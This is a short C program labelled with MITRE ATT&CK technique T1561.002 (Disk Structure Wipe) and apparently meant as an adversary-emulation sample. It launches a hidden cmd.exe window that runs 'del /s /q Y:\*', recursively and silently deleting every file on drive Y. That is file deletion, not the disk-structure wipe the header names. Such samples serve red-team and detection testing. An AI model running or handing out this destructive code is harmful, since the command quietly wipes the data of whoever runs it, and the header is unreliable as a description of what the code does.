// Link      = https://attack.mitre.org/techniques/T1561/002/
// Technique = Disk Wipe: Disk Structure Wipe
// ID        = T1561.002
// Tactics   = Impact

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("del /s /q Y:\\*");
    return 0;
}